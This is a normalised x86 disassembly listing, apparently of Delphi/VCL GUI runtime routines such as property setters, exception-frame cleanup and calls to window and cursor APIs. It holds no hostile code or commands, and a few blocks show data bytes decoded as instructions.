call sub_447508
pop esi
retn
sub_4474cc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4475f4
pop esi
retn
sub_4474e0
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4474f4
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4475e7
jmp sub_403a98
sub_4475ee
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44767e
jmp sub_403a98
sub_447685
pop ebx
pop ecx
pop ebp
retn
sub_44768c
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_44769c
retn
sub_4476a0
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_4476c0
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_447820
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4478f0
retn
sub_447a08
jmp sub_403a98
sub_447a0f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447ada
jmp sub_403a98
sub_447b04
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_447b96
jmp sub_403a98
sub_447d68
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_44800c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_4480e8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_445b14
pop esi
retn
sub_4481ac
push esi
mov si 0xffc1
call sub_403540
pop esi
retn
sub_4481d8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4481ec
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_448200
call sub_445ad4
retn
sub_448208
call sub_445ad4
retn
sub_448210
call sub_445ad4
retn
sub_4482b8
push ebx
mov ebx eax
mov eax ebx
call sub_44416c
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41d9c8
mov dx 0xb009
mov eax ebx
call sub_445b14
pop ebx
retn
sub_44841c
call sub_445ad4
retn
sub_448424
call sub_445ad4
retn
sub_44842c
call sub_445ad4
retn
sub_448434
call sub_445ad4
retn
sub_448498
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44892e
jmp sub_403a98
sub_448935
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448a14
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_448bb8
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_443750
retn
sub_448c58
push ebx
mov ebx eax
mov eax ebx
call sub_449088
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_448c74
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_448e4c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_448d84
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_448ea4
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_443750
sub_448ec4
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_443750
sub_448ee8
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_448ef4
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_443750
sub_448fa0
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_448f44
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_44907c
jmp sub_403a98
sub_449083
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4492a2
jmp sub_403a98
sub_4492a9
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4493b0
call sub_443520
retn
sub_4497fe
jmp sub_403a98
sub_449894
mov eax [ r-xdata ]
retn
sub_4499fb
jmp sub_403a98
sub_449b0c
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_443750
sub_449b2c
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_443750
sub_449e42
jmp sub_403a98
sub_449f84
test [ eax + 0x52 ] 0x4
setne al
retn
sub_44a0e0
jmp sub_403a98
sub_44a0e7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41e108
retn
sub_44a103
jmp sub_403a98
sub_44a110
retn
sub_44a1e4
mov [ edx + 0xc ] 0xffffffff
retn
sub_44a242
jmp sub_403a98
sub_44a249
pop ecx
pop ecx
pop ebp
retn
sub_44a2e9
jmp sub_403a98
sub_44a2f0
pop ebx
mov esp ebp
pop ebp
retn
sub_44a35c
call sub_4462dc
retn
sub_44a3ef
jmp sub_403a98
sub_44a3f6
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_44a5d5
jmp sub_403a98
sub_44a5dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a738
push ebx
mov ebx eax
mov eax ebx
call sub_44f6e4
or edx 0xffffffff
mov eax ebx
call sub_44a864
pop ebx
retn
sub_44a810
jmp sub_403a98
sub_44a864
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_44a750
sub_44a9d4
push ebx
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_44a9ec
push ebx
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_44aad8
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_446f14
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_44ab73
jmp sub_403a98
sub_44ab7a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ab9d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41e108
retn
sub_44ab96
jmp sub_403a98
sub_44ab9d
pop ebx
pop ecx
pop ebp
retn
sub_44aba4
retn
sub_44ac0c
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_44af79
jmp sub_403a98
sub_44b160
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_44b34c
jmp sub_403a98
sub_44b3fc
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_44b410
inc [ eax + 0x6c ]
retn
sub_44b414
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_44cc94
sub_44b574
call sub_44bc74
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_44bf1f
jmp sub_403a98
sub_44bf26
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bf43
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_44bf3c
jmp sub_403a98
sub_44bf43
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c224
jmp sub_403a98
sub_44c22b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c248
mov eax [ ebp - 0x4 ]
call sub_41e108
retn
sub_44c241
jmp sub_403a98
sub_44c248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c265
mov eax [ ebp - 0x4 ]
call sub_403344
retn
sub_44c25e
jmp sub_403a98
sub_44c265
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c719
jmp sub_403a98
sub_44c720
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c8ab
jmp sub_403a98
sub_44c8b2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44c967
jmp sub_403a98
sub_44c96e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44ca5c
jmp sub_403a98
sub_44caad
jmp sub_403a98
sub_44cab4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44cb70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b480
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_44ccbc
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_44afbc
sub_44d5bc
jmp sub_403a98
sub_44d5c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d68c
call GetCapture
retn
sub_44d694
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40d1e0
pop ebx
retn
sub_44d6a4
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44d90a
jmp sub_403a98
sub_44db04
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44dd18
jmp sub_403a98
sub_44dd1f
pop ebx
mov esp ebp
pop ebp
retn
sub_44ddcb
jmp sub_403a98
sub_44ddd2
pop ebp
retn
sub_44de5a
jmp sub_403a98
sub_44de61
pop ebp
retn
sub_44e0a8
stc
push ebx
push eax
call [ eax + ebp * 8 + 0x44 ]
add [ eax + ebp * 8 - 0x155fffbc ] bl
inc esp
add al al
0x54110044 0x7543
sub_44e52f
add al bh
jmp sub_44e577
sub_44e5b0
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_414418
retn
sub_44e5c8
mov al 0x1
retn
sub_44e5cc
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41a1e0
retn
mov eax edx
retn
sub_44e5dc
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41a1b0
retn
mov al 0x1
retn
sub_44e8cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4143bc
pop esi
pop ebx
retn
sub_44e8e0
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44e91c
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44eb80
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
pop ebx
retn
sub_44eb94
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
pop ebx
retn
sub_44eba8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
pop ebx
retn
sub_44ebbc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
pop ebx
retn
sub_44ebd0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
pop ebx
retn
sub_44ebe4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
pop ebx
retn
sub_44ebf8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
pop ebx
retn
sub_44ec0c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
pop ebx
retn
sub_44ec20
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
pop ebx
retn
sub_44ec34
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
pop ebx
retn
sub_44ec48
retn
sub_44ec4c
retn
sub_44ec50
retn
sub_44ec54
retn
sub_44ec58
retn
sub_44ec5c
retn
sub_44ec60
retn
sub_44ec64
retn
sub_44ec68
retn
sub_44ec6c
retn
sub_44ec70
retn
sub_44ec74
retn
sub_44ef20
jmp sub_403a98
sub_44f2bc
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x90 ] eax
sub_44f2e4
push esi
mov si 0xffef
call sub_403540
pop esi
retn
sub_44f385
jmp sub_403a98
sub_44f38c
pop ebp
retn
sub_44f390
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413bf4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413bf4
sub_44f5b8
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44f791
jmp sub_403a98
sub_44f798
pop ebx
pop ecx
pop ebp
retn
sub_44f79c
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44f7a4
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44fa0c
sub_44f851
jmp sub_403a98
sub_44f858
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403344
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44f960
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_44fa9f
jmp sub_403a98
sub_44faa6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fb3e
jmp sub_403a98
sub_44fb45
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fb62
mov eax [ ebp - 0xc ]
call sub_403344
retn
sub_44fb5b
jmp sub_403a98
sub_44fb62
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403540
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fc39
jmp sub_403a98
sub_44fc77
jmp sub_403a98
sub_44fc7e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403540
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fe43
jmp sub_403a98
sub_44fe4a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe67
mov eax [ ebp - 0xc ]
call sub_403344
retn
sub_44fe60
jmp sub_403a98
sub_44fe67
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44fee0
retn
sub_44fe80
jmp sub_403a98
sub_44fecf
jmp sub_403a98
sub_44fed6
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44ff5f
jmp sub_403a98
sub_44ff66
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ff6c
or edx 0xffffffff
call sub_44fee0
retn
sub_45037b
jmp sub_403a98
sub_450382
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45039f
mov eax [ ebp - 0xc ]
call sub_403344
retn
sub_450398
jmp sub_403a98
sub_45039f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4503bc
mov eax [ ebp - 0x4 ]
call sub_450eb4
retn
sub_4503b5
jmp sub_403a98
sub_4503bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4505c0
jmp sub_403a98
sub_4505c7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4505cc
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403540
sub_4505e4
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412edc
pop ebx
retn
sub_450688
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_414210
sub_45079f
jmp sub_403a98
sub_4507a6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403344
retn
sub_4507bc
jmp sub_403a98
sub_450ace
jmp sub_403a98
sub_450ad5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450af2
mov eax [ ebp - 0x10 ]
call sub_403344
retn
sub_450aeb
jmp sub_403a98
sub_450af2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450b0f
mov eax [ ebp - 0x8 ]
call sub_403344
retn
sub_450b08
jmp sub_403a98
sub_450b0f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450b78
jmp sub_403a98
sub_450c91
jmp sub_403a98
sub_450cae
jmp sub_403a98
sub_450e66
jmp sub_403a98
sub_450e6d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450eb0
inc [ eax + 0x5c ]
retn
sub_450eb4
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403540
sub_450f08
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_450f45
jmp sub_403a98
sub_450f4c
pop ebp
retn
sub_450f50
sub [ rw-data ] 0x1
retn
sub_451e5b
jmp [ eax + eax ]
sub_451eb8
mov eax [ esp + 0x8 ]
retn
sub_451ec0
push ebx
mov ebx eax
call sub_451eb8
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
jmp sub_403ad0
sub_451edc
pop ebx
retn
sub_452155
jmp sub_403a98
sub_45215c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4522a7
jmp sub_403a98
sub_4522ae
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4522c4
push ebx
mov eax [ rw-data ]
call sub_414910
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_4148cc
mov eax ebx
pop ebx
retn
sub_45244c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_452468
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_452b63
jmp sub_403a98
sub_452b6a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452c62
jmp sub_403a98
sub_452c69
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45308c
jmp sub_403a98
sub_453093
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45353f
jmp sub_403a98
sub_4539e0
jmp sub_403a98
sub_4539e7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453e4b
jmp sub_403a98
sub_454308
jmp sub_403a98
sub_45430f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4546ba
jmp sub_403a98
sub_4546c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4546cf
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45487c
mov eax [ r-xdata ]
retn
sub_4548b8
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4548cc
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4548dc
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4548ec
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_454be8
mov edx eax
sub_454984
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
mov edx esi
call sub_454904
pop esi
pop ebx
retn
sub_454a00
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_454be8
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_414418
mov ecx eax
sub_454dd8
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_454e40
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_4551e8
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45521c
sub_45521c
mov edx sub_4551f4
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_452344
retn
sub_455406
jmp sub_403a98
sub_45540d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4558a4
jmp sub_403a98
sub_4558e3
jmp sub_403a98
sub_4558ea
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455a88
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_455bc4
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403540
pop esi
pop ebp
retn 0x8
sub_455be0
mov eax [ eax + 0x34 ]
call sub_452e18
retn
sub_455bec
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403540
pop esi
retn
sub_455c28
push ebx
mov ecx sub_455c00
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_452344
pop ebx
retn
sub_455e5c
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_455e70
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_4037e4#8
jmp sub_4037e4
sub_4560a7
jmp sub_403a98
sub_4560d2
jmp sub_403a98
sub_4560d9
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4560f0
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_4562d8
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_455c28
sub_456358
jmp sub_403a98
sub_45639c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4563b4
push ebx
mov ebx eax
mov eax ebx
call sub_41a200
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_456406
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_455c28
sub_45647c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4565c5
jmp sub_403a98
sub_4565cc
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45680c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45681c
sub_456870
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_456880
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_456890
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_4568a0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_4568b0
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_456928
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_452c70
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_452c70
retn
sub_456944
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_452c70
sub_45698c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_455be0
retn
mov eax edx
retn
j_sub_4037e4#6
jmp sub_4037e4
sub_4569cb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46321c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456d31
jmp sub_403a98
sub_456d38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403344
retn
sub_456d4e
jmp sub_403a98
sub_456e4f
jmp sub_403a98
sub_456e56
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456e73
mov eax [ ebp - 0x14 ]
call sub_403344
retn
sub_456e6c
jmp sub_403a98
sub_456e91
jmp sub_403a98
sub_456f1b
jmp sub_403a98
sub_456f22
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456f54
push ebx
mov ebx eax
mov eax ebx
call sub_414500
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41afb0
sub_457018
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_45702c
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_457034
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_4573f9
jmp sub_403a98
sub_457400
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
